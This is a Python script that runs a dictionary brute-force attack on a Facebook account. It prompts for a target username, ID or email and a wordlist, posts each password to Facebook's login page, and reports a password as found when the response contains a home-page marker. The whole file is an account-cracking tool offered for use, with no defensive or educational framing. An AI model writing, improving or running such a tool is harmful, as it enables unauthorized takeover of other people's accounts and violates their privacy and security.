import time
import os
import requests
from bs4 import BeautifulSoup

os.system('clear')
time.sleep(0.5)

user = input('[?] Target Username/ID/Email >>> ')
time.sleep(0.8)
wrdlstFileName = input('\n[?] Wordlist Directory >>> ')

try:
    with open(wrdlstFileName, 'r') as wordlist:
        passwords = wordlist.readlines()
except FileNotFoundError:
    print('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print('\n\nCracking ' + user + ' Now...')

time.sleep(1)
print('\n#############################################\n')

for password in passwords:
    password = password.strip()  # ফাঁকা লাইন বাদ দিন
    if not password:
        continue
    try:
        session = requests.Session()
        login_url = 'https://www.facebook.com/login.php'
        payload = {
            'email': user,
            'pass': password
        }
        response = session.post(login_url, data=payload)

        if 'home_icon' in response.text:
            print('[+] Password Found > ' + password)
            exit()
        else:
            print("[!] Wrong Password! > " + str(password))
    except KeyboardInterrupt:
        print('\n#############################################\n   Exiting..')
        exit()

time.sleep(1)
print('Sorry, none of the passwords in your wordlist is right.')
time.sleep(0.8)
exit()
